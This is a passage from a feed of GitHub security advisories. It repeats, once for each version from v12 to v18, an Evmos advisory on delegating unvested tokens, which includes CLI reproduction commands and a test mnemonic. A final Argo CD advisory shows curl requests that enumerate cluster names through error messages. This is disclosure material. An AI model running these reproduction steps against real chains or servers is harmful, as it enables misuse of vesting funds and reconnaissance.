            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v12] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v13] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v14] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v15] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v16] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v17] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v18] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It’s possible for authenticated users to enumerate clusters by name by inspecting error messages:</p>\n<pre><code>$ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name' -H \"Authorization: \nBearer $token\"\n{\"error\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\"}⏎                                 \n                                   \n$ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorizati\non: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<p>It’s also possible to enumerate the names of projects with project-scoped clusters if you know the names of the clusters.</p>\n<pre><code>curl -k 'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\"}\n\ncurl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\":\"permission denied\"}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<p>Credits\nThis vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36106\">https://nvd.nist.gov/vuln/detail/CVE-2024-36106</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9\">https://github.com/argoproj/argo-cd/commit/c2647055c261a550e5da075793260f6524e65ad9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cqf-953p-h5cp\">https://github.com/advisories/GHSA-3cqf-953p-h5cp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp",
            "title": "[github.com/argoproj/argo-cd] Argo-cd authenticated users can enumerate clusters by name",
            "date_modified": "2024-06-06T19:04:56.000Z",
            "date_published": "2024-06-06T19:04:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cqf-953p-h5cp"
            },
            "tags": [
                "severity"
            ]
        },
        {
